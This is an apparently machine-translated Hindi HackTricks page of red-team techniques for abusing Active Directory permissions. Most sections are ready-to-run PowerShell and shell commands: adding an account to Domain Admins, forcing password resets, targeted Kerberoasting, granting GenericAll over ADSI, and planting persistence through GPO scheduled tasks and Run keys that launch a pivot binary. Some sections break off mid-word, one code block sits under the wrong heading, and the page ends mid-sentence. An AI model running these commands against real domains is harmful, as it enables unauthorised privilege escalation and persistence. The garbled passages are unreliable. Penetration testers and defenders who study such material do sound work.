# एक्टिव डायरेक्टरी ACLs/ACEs का दुरुपयोग

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके।

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

वे सुरक्षितता खोजें जो सबसे अधिक मायने रखती है ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का ट्रैक करता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी तकनीकी स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक में मुद्दे खोजता है। [**आज ही मुफ्त में इसका प्रयास करें**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**यह पृष्ठ मुख्य रूप से [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) और [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) से तकनीकों का सारांश है। अधिक विवरण के लिए, मूल लेखों की जांच करें।**


## **उपयुक्त सभी अधिकार उपयोगकर्ता पर**
इस विशेषाधिकार से हमलावर को लक्षित उपयोगकर्ता खाते पर पूरा नियंत्रण होता है। एक बार `GenericAll` अधिकार साबित होने पर `Get-ObjectAcl` कमांड का उपयोग करके हमलावर:

- **लक्षित का पासवर्ड बदलें**: `net user <username> <password> /domain` का उपयोग करके हमलावर उपयोगकर्ता का पासवर्ड रीसेट कर सकता है।
- **लक्षित Kerberoasting**: SPN को उपयोगकर्ता के खाते में असाइन करके इसे kerberoastable बनाएं, फिर Rubeus और targetedKerberoast.py का उपयोग करके टिकट-ग्रांटिंग टिकट (TGT) हैश को निकालने और क्रैक करने का प्रयास करें।
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **लक्षित ASREPRoasting**: प्री-प्रमाणीकरण को अक्षम करें उपयोगकर्ता के लिए, जिससे उनका खाता ASREPRoasting के लिए विकल्पनीय बन जाता है।
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **सामान्य सभी अधिकार समूह पर**
यह विशेषाधिकार एक हमलावर को समूहों की सदस्यता में परिवर्तन करने की अनुमति देता है अगर उनके पास `सामान्य सभी` अधिकार हैं किसी समूह पर जैसे `डोमेन व्यवस्थापक`. `Get-NetGroup` के साथ समूह का विशिष्ट नाम पहचानने के बाद, हमलावर निम्न कार्रवाई कर सकता है:

- **अपने आप को डोमेन व्यवस्थापक समूह में जोड़ें**: इसे सीधे कमांड्स के माध्यम से या Active Directory या PowerSploit जैसे मॉड्यूल का उपयोग करके किया जा सकता है।
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **जेनेरिकऑल / जेनेरिकराइट / कंप्यूटर/उपयोगकर्ता पर लेखन**
किसी कंप्यूटर ऑब्ज
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **स्वयं (स्वयं सदस्यता) समूह पर**
यह विशेषाधिकार हमलावर्गियों को स्वयं को `Domain Admins` जैसे विशेष समूहों में जोड़ने की स्वीकृति देता है, जो समूह सदस्यता को सीधे प्रभावित करने वाले कमांडों का उपयोग करता है। निम्नलिखित कमांड क्रम का उपयोग स्वयं जोड़ने की अनुमति देता है:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (स्व-सदस्यता)**
एक समान विशेषाधिकार, यह हमलावरों को सीधे समूहों में अपने आप को जोड़ने की अनुमति देता है यदि उनके पास उन समूहों पर `WriteProperty` अधिकार है। इस विशेषाधिकार की पुष्टि और क्रियान्वयन का निर्वाहण किया जाता है:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
एक उपयोगकर्ता पर `User-Force-Change-Password` के लिए `ExtendedRight` को धारित करना वर्तमान पासवर्ड पता नहीं होने पर पासवर्ड रीसेट करने की अनुमति देता है। इस अधिकार की पुष्टि और इसका शोषण पावरशेल या वैकल्पिक कमांड-लाइन उपकरणों के माध्यम से किया जा सकता है, जो एक उपयोगकर्ता का पासवर्ड रीसेट करने के कई तरीके प्रदान करता है, जिसमें इंटरैक्टिव सत्र और गैर-इंटरैक्टिव पर्यावरणों के लिए वन-लाइनर्स शामिल हैं। कमांड साधारित पावरशेल आह्वान से लेकर लिनक्स पर `rpcclient` का उपयोग करने तक का है, जो हमले के वेक्टर्स की विविधता को प्रदर्शित करता है।
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **ग्रुप पर WriteOwner लिखें**
यदि किसी हमलावर को पता चलता है कि उनके पास किसी ग्रुप पर `WriteOwner` अधिकार हैं, तो वे ग्रुप की स्वामित्व को अपने नाम पर बदल सकते हैं। यह विशेष रूप से प्रभावी होता है जब ग्रुप `Domain Admins` होता है, क्योंकि स्वामित्व बदलने से ग्रुप विशेषताओं और सदस्यता पर अधिक नियंत्रण मिलता है। इस प्रक्रिया में सही ऑब्जेक्ट की पहचान `Get-ObjectAcl` के माध्यम से होती है और फिर `Set-DomainObjectOwner` का उपयोग करके स्वामी को परिवर्तित किया जाता है, या तो SID द्वारा या नाम द्वारा।
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **उपयोगकर्ता पर GenericWrite**
यह अनुमति एक हमलाविशेषज्ञ को उपयोगकर्ता गुणों को संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` एक्सेस के साथ, हमलाविशेषज्ञ उपयोगकर्ता लॉगऑन पथ को बदल सकता है ताकि उपयोगकर्ता लॉगऑन पर एक दुरुपयोगी स्क्रिप्ट को निष्पादित कर सके। इसे उपयोगकर्ता के `scriptpath` गुण को अपडेट करने के लिए `Set-ADObject` कमांड का उपयोग करके प्राप्त किया जाता है।
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **समानार्थक लेखन ग्रुप पर**
इस अधिकार के साथ, हमलावर ग्रुप सदस्यता को मानिपुर्थ कर सकते हैं, जैसे किसी विशेष ग्रुप में अपने आप को या अन्य उपयोगकर्ताओं को जोड़ना। इस प्रक्रिया में एक प्रमाण पदार्थ बनाना शामिल है, इसका उपयोग करके उपयोगकर्ताओं को ग्रुप से जोड़ना या हटाना, और PowerShell कमांड के साथ सदस्यता परिवर्तनों की पुष्टि करना।
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
एडी ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` विशेषाधिकार होना एक हमलावार को ऑब्जेक्ट पर `GenericAll` विशेषाधिकार प्राप्त करने की सक्षमता प्रदान करता है। यह ADSI मानिपुलेशन के माध्यम से प्राप्त किया जाता है, जिससे ऑब्ज
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **डोमेन पर प्रतिलिपि (DCSync)**
DCSync हमला डोमेन पर विशिष्ट प्रतिलिपि अनुमतियों का उपयोग करता है एक डोमेन कंट्रोलर की भूमिका नकल करने और डेटा समकालीन करने के लिए, सहित उपयोगकर्ता क्रेडेंशियल्स सहित जानकारी। यह शक्तिशाली तकनीक अनुमतियों जैसे `DS-Replication-Get-Changes` की आवश्यकता है, जो हमलावादियों को एडी परिवेश से संबंधित महत्वपूर्ण जानकारी निकालने की अनुमति देती है बिना किसी डोमेन कंट्रोलर के सीधे पहुंच के।
[**DCSync हमले के बारे में अधिक जानें यहाँ।**](../dcsync.md)







## GPO समर्पण <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO समर्पण

समूह नीति वस्तुओं (GPOs) को प्रबंधित करने के लिए सौंपी गई पहुंच महत्वपूर्ण सुरक्षा जोखिम प्रस्तुत कर सकती है। उदाहरण के लिए, यदि एक उपयोगकर्ता जैसे `offense\spotless` को GPO प्रबंधन के अधिकार सौंपे गए हैं, तो उनके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसी विशेषाधिकार हो सकते हैं। ये अनुमतियाँ दुरुपयोग के लिए प्रयोग की जा सकती हैं, जैसा कि PowerView का उपयोग करके पहचाना गया है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### GPO अनुमतियों का जाँच करें

गलत रूप से कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को एक साथ जोड़ा जा सकता है। इससे किसी विशिष्ट उपयोगकर्ता के पास प्रबंधन करने की अनुमति है उन GPOs की खोज की जा सकती है:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**एक दिए गए नीति को लागू करने वाले कंप्यूटर**: किसी विशिष्ट GPO को किस कंप्यूटर पर लागू किया गया है, इसे सुलझाने में मदद कर सकता है।
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**किसी दिए गए कंप्यूटर पर लागू नीतियाँ**: किसी विशेष कंप्यूटर पर कौन-कौन सी नीतियाँ लागू हैं, `Get-DomainGPO` जैसे कमांड का उपयोग किया जा सकता है।

**एक दिए गए नीति को लागू करने वाले OUs**: दिए गए नीति से प्रभावित संगठनिक इकाइयों (OUs) की पहचान करने के लिए `Get-DomainOU` का उपयोग किया जा सकता है।

### GPO का दुरुपयोग - New-GPOImmediateTask

गलत रूप से कॉन्फ़िगर किए गए GPOs का दुरुपयोग किया जा सकता है कोड निष्पादित करने के लिए, उदाहरण के लिए, तत्काल निर्धारित कार्य को बनाकर। इसे किया जा सकता है ताकि प्रभावित मशीनों पर स्थानीय प्रशासकों समूह में एक उपयोगकर्ता जोड़ा जा सके, जो अधिकारों को काफी ऊंचा कर सकता है:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy मॉड्यूल - GPO का दुरुपयोग

यदि स्थापित है, तो GroupPolicy मॉड्यूल नए GPO बनाने और लिंक करने की अनुमति देता है, और प्राथमिकताएँ सेट करने के लिए जैसे रजिस्ट्री मानों को प्रभावित कंप्यूटर पर बैकडोअर्स को क्रियान्वित करने के लिए। इस विधि की आवश्यकता है कि GPO को अपडेट किया जाए और किसी उपयोगकर्ता को कंप्यूटर में लॉग इन करने के लिए क्रियान्वित किया जाए:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO का दुरुपयोग

SharpGPOAbuse एक विधि प्रदान करता है जिससे मौजूदा GPOs का दुरुपयोग किया जा सकता है टास्क जोड़कर या सेटिंग्स को संशोधित करके नए GPOs बनाने की आवश्यकता नहीं होती। इस उपकरण को मौजूदा GPOs को संशोधित करने या परिवर्तन लागू करने से पहले नए बनाने की आवश्यकता होती है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO अपडेट सामान्यत: हर 90 मिनट में होते हैं। इस प्रक्रिया को तेजी से बढ़ाने के लिए, खासकर किसी बदलाव को लागू करने के बाद, लक्षित कंप्यूटर पर `gpupdate /force` कमांड का उपयोग किया जा सकता है ताकि तत्काल नीति अपड
